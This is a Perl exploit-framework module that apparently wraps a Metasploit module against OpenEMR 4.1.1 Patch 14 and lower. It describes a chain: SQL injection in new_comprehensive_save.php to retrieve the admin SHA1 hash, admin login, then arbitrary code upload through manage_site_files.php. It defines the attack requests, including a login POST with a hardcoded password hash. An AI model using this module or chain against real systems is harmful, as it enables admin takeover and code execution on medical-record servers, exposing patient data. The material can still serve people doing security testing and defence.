package OPENEMR::MSF::OpenemrSqliPrivescUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "OpenemrSqliPrivescUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a vulnerability found in OpenEMR version 4.1.1 Patch 14 and lower.

        When logging in as any non-admin user, it's possible to retrieve the admin SHA1 password

        hash from the database through SQL injection. The SQL injection vulnerability exists

        in the \"new_comprehensive_save.php\" page. This hash can be used to log in as the admin

        user. After logging in, the \"manage_site_files.php\" page will be used to upload arbitrary

        code.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "openemr_sqli_privesc_upload",
  OSVDB       => 97482,
  PATH        => "auth=login&site=default&",
  PATHS       => ["openemr"],
  PAYLOAD     => "authProvider=Default&authUser=__NAME__&authPass=__PASS__&",
  VARIABLES => {
    'PAYLOAD_NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
    'PASS' =>       { DESCRIPTION => "The non-admin password", VALUE => "" },
    'COOKIE' =>       { DESCRIPTION => "", VALUE => "" },
    'USER' =>       { DESCRIPTION => "The non-admin user", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "The base path to the OpenEMR installation",
  VALUE => "/openemr",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'interface/main/main_screen.php',
      PAYLOAD      => 'authProvider=Default&authUser=__USERNAME__&authPass=599fbe69dcefdb198c92802cf87e065730f3a2ee',
      TEXT   => 'Sending Exploit #1 Request : [POST] /interface/main/main_screen.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
